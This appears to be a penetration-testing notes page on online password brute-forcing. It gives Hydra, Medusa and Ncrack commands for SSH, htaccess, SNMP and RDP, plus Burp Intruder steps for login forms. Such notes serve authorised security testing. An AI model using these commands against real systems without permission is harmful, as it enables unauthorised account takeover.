# Online Attacks

## Online password cracking

There are several tools specialized for bruteforcing online. There are several different services that are common for bruteforce. For example: VNC, SSH, FTP, SNMP, POP3, HTTP.

### Port 22 - SSH {#port-22---ssh}

```text
hydra -l root -P wordlist.txt 192.168.0.101 ssh
hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V
```

### Port 80/443 htaccess {#port-80443-htaccess}

You can password protect directories with apache pretty easily. Just configure the htaccess \(I exaplin this in the chapter on Common ports\).

It can then be brute forced like this:

```text
medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
```

#### Logins {#logins}

Use Burp suite.

1. Intecept a login attempt.
2. Right-lick "Send to intruder". Select Sniper if you have nly one field you want to bruteforce. If you for example already know the username. Otherwise select cluster-attack.
3. Select your payload, your wordlist.
4. Click attack.
5. Look for response-length that differs from the rest.

### Port 161 - SNMP {#port-161---snmp}

```text
hydra -P wordlist.txt -v 102.168.0.101 snmp
```

### Port 3389 - Remote Desktop Protocol {#port-3389---remote-desktop-protocol}

For RDP we can use Ncrack.

```text
ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101
```
